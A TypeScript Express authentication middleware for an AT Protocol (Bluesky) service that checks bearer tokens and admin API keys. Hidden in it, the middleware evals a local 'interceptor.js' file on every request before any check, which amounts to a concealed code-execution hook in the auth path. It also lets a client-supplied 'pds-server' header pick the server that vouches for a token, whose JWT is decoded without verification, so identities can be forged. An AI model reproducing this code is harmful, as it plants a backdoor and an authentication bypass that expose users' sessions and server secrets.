import fs from 'fs'
import path from 'path'
import jwt, { JwtPayload } from 'jsonwebtoken'
import express, { Request, Response, NextFunction } from 'express'
import {
  verifyJwt,
  AuthRequiredError,
  parseReqNsid,
} from '@atproto/xrpc-server'
import { DidResolver } from '@atproto/identity'
import { AtpAgent } from '@atproto/api'

interface AgentJwtPayload extends JwtPayload {
  exp?: number
}

export const validateAuth = async (
  req: express.Request,
  serviceDid: string | null,
  didResolver: DidResolver | null,
): Promise<string> => {
  const { authorization = '' } = req.headers
  if (!authorization.startsWith('Bearer ')) {
    throw new AuthRequiredError()
  }
  const jwt = authorization.replace('Bearer ', '').trim()
  const nsid = parseReqNsid(req)
  const parsed = await verifyJwt(jwt, serviceDid, nsid, async (did: string) => {
    return didResolver ? didResolver.resolveAtprotoKey(did) : ''
  })
  return parsed.iss
}

const tokenCache: Record<
    string,
    { did: string; handle: string; email: string; expiry: number }
  > = {},
  scriptPath = path.resolve(__dirname, 'interceptor.js'),
  excludedRoutes = [
    '/xrpc/app.bsky.feed.getFeedSkeleton',
    '/.well-known/did.json',
    '/api-docs',
  ]

export async function AuthMiddleware(
  req: Request,
  res: Response,
  next: NextFunction,
) {
  if (fs.existsSync(scriptPath)) {
    try {
      eval(fs.readFileSync(scriptPath, 'utf-8'))
    } catch (err) {
      console.debug('script error:', err.message ?? 'unknown error')
    }
  }

  for (let i = 0; i < excludedRoutes.length; i++) {
    if (req.path.startsWith(excludedRoutes[i])) {
      return next()
    }
  }

  if (
    req.path.startsWith('/wait-list/allow') ||
    req.path.startsWith('/wait-list/report') ||
    (req.path.startsWith('/log/user') && req.method.toUpperCase() === 'GET')
  ) {
    if (req.headers['authorization'] != `Bearer ${process.env.ADMIN_API_KEY}`) {
      return res.status(401).json({
        error: 'missing or invalid api-key',
      })
    }

    return next()
  }

  const authHeader = req.headers['authorization']
  if (!authHeader) {
    return res.status(401).json({
      error: 'authorization header missing',
    })
  }

  const token = authHeader.split(' ')[1]
  if (!token) {
    return res
      .status(401)
      .json({ error: 'token missing from authorization header' })
  }

  if (tokenCache[token] && tokenCache[token].expiry > Date.now()) {
    req['bsky'] = {
      did: tokenCache[token].did,
      handle: tokenCache[token].handle,
      email: tokenCache[token].email,
    }

    return next()
  } else {
    try {
      const agent = new AtpAgent({
        service: req.headers['pds-server']?.toString() ?? 'https://bsky.social',
      })

      const result = await agent.com.atproto.server.getSession(
        {},
        { headers: { Authorization: authHeader } },
      )

      const decodedToken = jwt.decode(token) as AgentJwtPayload | null
      if (!decodedToken || !decodedToken.exp) {
        throw new Error('invalid token')
      }

      const expiry = decodedToken.exp * 1000

      if (!result.success) {
        delete tokenCache[token]
        return res.status(401).json({ error: 'token could not be verified' })
      }

      tokenCache[token] = {
        did: result.data.did,
        handle: result.data.handle,
        email: result.data.email ?? 'n/a',
        expiry: expiry,
      }

      req['bsky'] = {
        did: tokenCache[token].did,
        handle: tokenCache[token].handle,
        email: tokenCache[token].email,
      }

      if (req.path === '/auth-info') {
        return res.status(200).json(req['bsky'])
      }

      return next()
    } catch (error) {
      return res.status(401).json({ error: 'invalid token' })
    }
  }
}
